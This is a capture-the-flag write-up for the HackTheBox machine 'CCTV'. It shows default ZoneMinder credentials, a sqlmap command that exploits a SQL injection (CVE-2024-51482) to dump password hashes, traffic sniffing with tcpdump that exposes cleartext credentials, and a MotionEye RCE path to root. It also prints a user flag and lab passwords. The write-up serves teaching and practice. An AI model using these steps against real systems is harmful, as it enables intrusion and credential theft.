# CCTV - HackTheBox

**OS:** Linux
**Difficulty:** Easy
**Flags:**
- user.txt: `9c89e86b11cc0e7d93a78d84a7f0ad9f`
- root.txt: [not recorded]

---

## Summary

CCTV runs a ZoneMinder instance accessible with default credentials. A SQL injection vulnerability (CVE-2024-51482) in the event tag removal endpoint leaks password hashes from the database. Cracking those hashes gives SSH access. From there, a tcpdump capability on the foothold user allows traffic capture on the internal Docker bridge, leaking credentials for a second user. That user can run a MotionEye instance as root, which is vulnerable to RCE (CVE-2025-60787).

---

## Recon

Add the hostname to `/etc/hosts` and browse to the web interface. ZoneMinder loads with default credentials.

```
admin:admin
```

---

## Foothold - CVE-2024-51482 (ZoneMinder SQL Injection)

The `tid` parameter in the event tag removal endpoint is injected directly into a SQL query with no sanitisation:

```sql
SELECT * FROM Events_Tags WHERE TagId = $tagId
```

**Vulnerable endpoint:**
```
GET /zm/index.php?view=request&request=event&action=removetag&tid=1
```

Use sqlmap with a saved request to dump the Users table:

```bash
# Quick targeted dump
sqlmap -r req.txt -p "tid" --batch --technique=T --dump -D zm -T Users -C Username,Password
```

This returns three bcrypt hashes for users `admin`, `mark`, and `superadmin`. Crack them offline. The hash for `mark` cracks to:

```
mark:openseame
```

SSH in as mark.

---

## Lateral Movement - Traffic Capture

Run linpeas to enumerate. It surfaces a capability that allows the current user to capture raw network traffic without root:

```bash
tcpdump -i any -nn -A tcp port 5000
```

The machine has Docker bridge interfaces visible. Capture traffic on all interfaces and watch port 5000. Credentials appear in cleartext:

```
USERNAME=sa_mark;PASSWORD=X1l9fx1ZjS7RZb;CMD=status
```

Switch to `sa_mark`:

```bash
su sa_mark
```

User flag is in the home directory.

---

## Privilege Escalation - CVE-2025-60787 (MotionEye RCE)

Enumerate local ports:

```bash
netstat -tulnp
```

| Port | Service |
|------|---------|
| 8765 | MotionEye 0.43.1b4 |
| 7999 | Motion HTTP control |
| 9081 | Motion MJPEG stream |
| 3306 | MySQL |
| 8554 | RTSP server |

A note in sa_mark's home directory (`SecureVision Staff Announcement.pdf`) hints at credential reuse across the infrastructure. Try `sa_mark`'s credentials against the MotionEye UI on port 8765.

MotionEye 0.43.1b4 is vulnerable to CVE-2025-60787 (RCE). The service runs as root per its systemd unit:

```ini
[Service]
User=root
ExecStart=/usr/local/bin/meyectl startserver -c /etc/motioneye/motioneye.conf
```

Exploit CVE-2025-60787 against the MotionEye instance to obtain a root shell.

---

## Key Takeaways

- Default credentials on web applications are always worth trying before any other attack
- CVE-2024-51482 is a classic unsanitised numeric parameter injection - the absence of quotes around an integer in a query is just as dangerous as missing quotes on a string
- Linux capabilities (particularly `CAP_NET_RAW`) are worth checking during post-exploitation - they can expose credentials travelling unencrypted on internal interfaces
- Services running as root should be scrutinised regardless of whether they are externally exposed - lateral movement to a user with access is enough
